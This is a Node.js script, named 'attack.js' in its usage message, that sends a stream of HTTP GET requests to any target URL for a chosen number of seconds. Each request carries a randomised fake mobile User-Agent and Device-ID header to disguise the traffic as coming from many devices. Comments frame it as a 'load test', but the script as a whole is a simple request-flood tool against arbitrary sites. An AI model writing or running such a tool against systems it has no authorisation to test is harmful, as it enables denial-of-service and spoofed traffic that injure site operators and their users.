const http = require('http');
const faker = require('faker');
const uuid = require('uuid');

// Generate Random Mobile User-Agent (UA)
function generateRandomUA() {
  const mobileBrands = ['Apple', 'Samsung', 'Huawei', 'Google', 'Xiaomi'];
  const devices = ['iPhone', 'Galaxy', 'Pixel', 'Mate', 'Redmi'];
  const osVersions = ['14.4', '10.0', '11', '9', '13'];
  const randomBrand = mobileBrands[Math.floor(Math.random() * mobileBrands.length)];
  const randomDevice = devices[Math.floor(Math.random() * devices.length)];
  const randomOSVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
  
  return `${randomBrand} ${randomDevice} ${randomOSVersion}`;
}

// Generate Random Device ID (Android or iOS format)
function generateRandomDeviceID() {
  const isAndroid = Math.random() < 0.5; // Randomly decide if it's Android or iOS
  return isAndroid ? uuid.v4().replace(/-/g, '') : faker.datatype.uuid().replace(/-/g, '');
}

// HTTP Request Function to send requests
function sendRequest(targetUrl) {
  const options = {
    hostname: targetUrl.hostname,
    port: 80, // Assuming HTTP/1.1, default port for HTTP
    path: targetUrl.pathname,
    method: 'GET',
    headers: {
      'User-Agent': generateRandomUA(),
      'Device-ID': generateRandomDeviceID(),
      'Connection': 'keep-alive',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.5',
    }
  };

  const req = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      console.log(`Response from ${targetUrl.hostname}: ${res.statusCode}`);
    });
  });

  req.on('error', (err) => {
    console.error(`Error: ${err.message}`);
  });

  req.end();
}

// Simulate Multiple Requests with Randomized User-Agent and Device ID
function simulateLoad(targetUrl, duration) {
  const endTime = Date.now() + duration * 1000; // Duration in milliseconds
  let requestsSent = 0;

  const interval = setInterval(() => {
    if (Date.now() >= endTime) {
      clearInterval(interval);
      console.log(`Test complete. ${requestsSent} requests sent.`);
      return;
    }
    
    sendRequest(targetUrl);
    requestsSent++;
  }, 100); // Delay 100ms between requests to avoid flooding
}

// Parse command-line arguments
const args = process.argv.slice(2);
if (args.length < 2) {
  console.log("Usage: node attack.js <target_url> <duration_in_seconds>");
  process.exit(1);
}

const targetUrl = new URL(args[0]); // Target URL (http://example.com)
const duration = parseInt(args[1], 10); // Duration in seconds

// Start the load test
simulateLoad(targetUrl, duration);
